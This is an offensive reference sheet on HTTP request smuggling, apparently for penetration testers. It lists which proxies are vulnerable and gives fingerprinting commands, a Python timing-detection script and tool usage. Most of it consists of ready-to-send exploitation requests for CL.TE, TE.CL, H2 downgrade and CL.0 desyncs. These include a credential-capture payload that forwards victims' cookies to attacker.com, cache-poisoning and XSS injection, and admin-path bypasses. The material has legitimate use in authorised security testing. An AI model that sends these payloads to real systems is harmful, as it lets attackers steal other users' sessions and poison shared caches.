# HTTP Request Smuggling Reference

## 1. Overview

HTTP Request Smuggling exploits disagreements between front-end and back-end servers on where one request ends and the next begins, allowing attackers to prepend malicious content to other users' requests. Primary targets: reverse proxy + origin pairs (GCP GLB + Istio/Envoy, Cloudflare + nginx) where header parsing differs.

## 2. When to Test

- Multiple servers in request path (CDN, LB, reverse proxy, WAF)
- HTTP/1.1 keep-alive or HTTP/2 downgrading to HTTP/1.1
- Discrepancies in `Transfer-Encoding` / `Content-Length` handling
- Backend supports chunked encoding but proxy doesn't validate
- H2C (HTTP/2 cleartext) upgrade paths exist
- Response splitting or desync indicators in timing differences
- Mixed infrastructure (e.g., Cloudflare → nginx, GCP GLB → Envoy)

## Target-Suitability Matrix (2026 Reality Check)

Before investing time in smuggling attempts, fingerprint the front-end proxy. Most modern deployments are hardened. Use this matrix to decide if smuggling is worth pursuing:

| Front-end | CL.TE | TE.CL | H2.CL | H2.TE | Notes |
|---|---|---|---|---|---|
| Nginx >= 1.21 | NO | NO | partial | partial | RFC-strict; rejects CL+TE with 400 |
| Caddy 2.x | NO | NO | — | — | Hardened by default |
| Envoy >= 1.20 | NO | NO | partial | partial | Hardened in most paths |
| HAProxy <= 2.4 | YES | YES | — | — | Vulnerable, see CVE-2021-40346 |
| AWS ALB + specific upstream | partial | partial | YES | YES | Several disclosed reports 2022-2024 |
| Cloudflare -> S3/Lambda chains | — | — | YES | YES | H2-downgrade attacks remain viable |
| Older F5 BIG-IP (TMM < 16) | YES | — | — | — | Vendor advisories |
| Citrix ADC/NetScaler (older firmware) | YES | YES | — | — | Disclosed 2020-2022 |
| Squid 3.x | YES | — | — | — | Older deployments |
| Apache Traffic Server (older) | YES | YES | YES | YES | PortSwigger research |
| Custom Python/Go proxies | YES | YES | — | — | Frequently miss RFC enforcement |

### Quick Fingerprint Check

```bash
# Identify front-end proxy from response headers
curl -sk -D- "https://target.com/" | grep -iE "(server:|via:|x-served-by:|x-cache)"

# Check HTTP/2 support (H2 smuggling requires H2 front-end)
curl -sk --http2 -D- "https://target.com/" 2>&1 | head -5

# Test CL+TE rejection (if 400 = hardened front-end)
curl -sk -X POST "https://target.com/" \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nX' -w "\n%{http_code}"
# 400 = front-end rejects ambiguous requests (hardened)
# 200/other = may be processable (investigate further)
```

### Decision Tree

```
Identify front-end proxy
├── Nginx >= 1.21, Caddy, Envoy >= 1.20
│   └── SKIP classic CL.TE/TE.CL. Only try H2.CL if HTTP/2 is enabled.
├── HAProxy, older F5/Citrix, Squid, ATS, custom proxies
│   └── PROCEED with full smuggling methodology
├── AWS ALB, Cloudflare
│   └── Focus on H2.CL and H2.TE vectors only
└── Unknown/unidentifiable
    └── Run quick CL+TE rejection test above, then decide
```

### Time Budget

- If front-end is hardened (Nginx/Caddy/Envoy): spend MAX 10 minutes on H2 vectors, then move on
- If front-end is potentially vulnerable: allocate up to 45 minutes for full methodology
- If front-end is confirmed vulnerable (CL+TE not rejected): this is high-priority, allocate full time

## 3. Techniques

### CL.TE (Front-end uses Content-Length, back-end uses Transfer-Encoding)

Front-end forwards full body by CL; back-end parses chunked, leaving remainder as next request start.

**Detection:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
If next request gets "Unknown method GPOST" → vulnerable.

**Exploitation:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 53
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: X
```

### TE.CL (Front-end uses Transfer-Encoding, back-end uses Content-Length)

Front-end parses chunked (forwards all chunks); back-end uses CL, stops early, treats remainder as next request.

**Detection:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**Exploitation:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
0


```

### TE.TE (Both support TE but one can be confused with obfuscation)

Both servers support chunked but obfuscated TE header causes one to fall back to CL.

**Obfuscation variants:**
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
X: x[\n]Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-encoding: identity
```

**Detection:** Same as CL.TE or TE.CL depending on which server ignores the obfuscated header.

**Exploitation:** Apply CL.TE or TE.CL payloads with obfuscated TE header above.

### H2.CL (HTTP/2 front-end, HTTP/1.1 back-end with Content-Length)

HTTP/2 has no CL concept in framing but allows CL header; back-end trusts the CL header after downgrade.

**Detection:**
```
:method POST
:path /
:authority target.com
content-length: 0

GET /404check HTTP/1.1
Host: target.com

```

**Exploitation:**
```
:method POST
:path /
:authority target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com

```
Send via h2 with body exceeding stated CL.

### H2.TE (HTTP/2 front-end injects Transfer-Encoding into downgraded request)

Inject `transfer-encoding: chunked` in H2 request; back-end processes chunked body after downgrade.

**Detection:**
```
:method POST
:path /
:authority target.com
transfer-encoding: chunked

0

GET /404check HTTP/1.1
Host: target.com

```

**Exploitation:**
```
:method POST
:path /
:authority target.com
transfer-encoding: chunked

0

POST /api/admin HTTP/1.1
Host: target.com
Content-Length: 5

x=1
```

### CL.0 (Back-end ignores body entirely on certain endpoints)

Back-end treats CL as 0 regardless of actual header (e.g., on redirects, static files). Body becomes next request in connection.

**Detection:**
```http
POST /static/logo.png HTTP/1.1
Host: target.com
Content-Length: 34
Connection: keep-alive

GET /admin HTTP/1.1
Host: target.com

```
If second response is /admin content → vulnerable.

**Exploitation:**
```http
POST /redirect-endpoint HTTP/1.1
Host: target.com
Content-Length: 56
Connection: keep-alive

GET /api/internal/users HTTP/1.1
Host: target.com
X: X
```

## 4. Detection Methods

### Timing-Based Detection (Python)

```python
import socket, time, ssl

def smuggle_detect(host, port=443, use_tls=True):
    payloads = {
        "CL.TE": (
            f"POST / HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
            f"1\r\nZ\r\nQ\r\n\r\n"  # invalid chunk → timeout if TE used
        ),
        "TE.CL": (
            f"POST / HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
            f"0\r\n\r\nX"  # extra byte → timeout if CL used
        ),
    }
    for name, payload in payloads.items():
        sock = socket.create_connection((host, port), timeout=10)
        if use_tls:
            ctx = ssl.create_default_context()
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.send(payload.encode())
        start = time.time()
        try:
            sock.recv(4096)
        except socket.timeout:
            pass
        elapsed = time.time() - start
        print(f"{name}: {elapsed:.2f}s {'⚠️ TIMEOUT (likely vuln)' if elapsed > 5 else '✓ OK'}")
        sock.close()

smuggle_detect("target.com")
```

### Differential Response Method

1. Send normal request → note response
2. Send smuggle prefix + normal request on same connection
3. If second response differs (403, 404, different body) → desync confirmed
4. Confirm with unique marker in smuggled prefix to rule out false positives

## 5. Exploitation Scenarios

### WAF Bypass
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 70
Transfer-Encoding: chunked

0

GET /api/cmd?exec=id HTTP/1.1
Host: target.com
X-Bypass: 1

```
Smuggled request bypasses WAF rules applied only at front-end.

### Cache Poisoning
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 64
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: evil.com
X: X

```
Next user's request gets response for evil.com cached under legitimate URL.

### Credential Capture
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 92
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

data=
```
Victim's request (with cookies/auth) appended to `data=` parameter, sent to attacker endpoint.

### Access Control Bypass
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 75
Transfer-Encoding: chunked

0

GET /admin/users HTTP/1.1
Host: target.com
X-Internal-Auth: true
X: X

```
Smuggled request inherits internal routing/trust of the connection.

## 6. Tools

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler && pip install -r requirements.txt
# Basic scan
python smuggler.py -u https://target.com
# With custom mutations
python smuggler.py -u https://target.com -m mutations/
```

### Burp HTTP Request Smuggler (Extension)
```
# Install via BApp Store in Burp Suite Pro
# Usage:
1. Extensions → BApp Store → "HTTP Request Smuggler" → Install
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Check Dashboard/Logger for desync indicators
# Config: adjust timeout (default 10s), enable H2 probes
```

### h2csmuggler
```bash
git clone https://github.com/BishopFox/h2cSmuggler.git
cd h2cSmuggler && pip install h2
# Test H2C upgrade
python h2csmuggler.py -x https://target.com http://backend/admin
# Scan multiple paths
python h2csmuggler.py -x https://target.com --scan-list paths.txt
```

## 7. Pitfalls

- **Connection reuse required** — tools/scripts must keep connections alive; single-request tests miss smuggling entirely
- **Timing sensitivity** — network jitter causes false positives; repeat tests 3-5x and use statistical thresholds (>5s delta)
- **Poisoning other users** — smuggled requests affect real traffic; use unique paths/headers and test in staging or low-traffic windows
- **HTTP/2 binary framing** — cannot test H2 smuggling with text-based tools; need h2-aware libraries (hyper, httpx with h2)
- **Infrastructure-specific behavior** — GCP GLB strips some headers, Cloudflare normalizes TE; always fingerprint proxy stack before selecting technique

## 8. Checklist

- [ ] 1. Map infrastructure: identify all proxies, LBs, CDNs in request path
- [ ] 2. Fingerprint each hop (Server header, error pages, timing)
- [ ] 3. Test CL.TE with timing-based detection payload
- [ ] 4. Test TE.CL with timing-based detection payload
- [ ] 5. Test TE.TE with all obfuscation variants
- [ ] 6. Test H2.CL and H2.TE if HTTP/2 is supported
- [ ] 7. Test CL.0 on static/redirect endpoints
- [ ] 8. Confirm desync with differential response (not just timing)
- [ ] 9. Demonstrate impact: WAF bypass, cache poison, or auth bypass
- [ ] 10. Document: technique used, affected endpoints, reproduction steps, remediation (normalize parsing, disable connection reuse, reject ambiguous requests)

---

## HTTP/2 Downgrade Smuggling

When front-end speaks HTTP/2 but back-end expects HTTP/1.1:

### H2.CL (HTTP/2 → Content-Length mismatch)
```
:method: POST
:path: /
:authority: target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com

```
Front-end forwards as HTTP/1.1 with CL:0, back-end sees smuggled second request.

### H2.TE (HTTP/2 → Transfer-Encoding injection)
```
:method: POST
:path: /
:authority: target.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

```
HTTP/2 doesn't use chunked encoding — but if proxy downgrades to H1, TE header becomes active.

### Header Injection via HTTP/2 HPACK
```
:method: POST
:path: /
foo: bar\r\nTransfer-Encoding: chunked
```
Some proxies fail to sanitize `\r\n` in HTTP/2 header values during downgrade.

---

## Request Tunneling

Smuggle a full request through a front-end that rewrites/blocks certain paths:

### Tunnel via HEAD
```
HEAD / HTTP/1.1
Host: target.com
Content-Length: 83

GET /admin HTTP/1.1
Host: target.com
Connection: close

```
HEAD response has no body — back-end treats leftover bytes as next request.

### Tunnel via Connection Reuse
1. Send valid request that gets 301/302 redirect (connection kept alive)
2. Smuggled bytes sit in buffer
3. Next legitimate user's request gets poisoned response

### Web Cache Poisoning via Smuggling
```
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: target.com
X-Injected: <script>alert(1)</script>

```
Cache stores poisoned response for `/static/main.js` — all visitors get XSS.

---

## Detection Tools

- **Burp HTTP Request Smuggler** extension (auto-detects CL.TE, TE.CL, H2.*)
- **smuggler.py**: `python3 smuggler.py -u https://target.com`
- **h2csmuggler**: `python3 h2csmuggler.py -x https://target.com/`
- **Turbo Intruder**: timing-based detection scripts
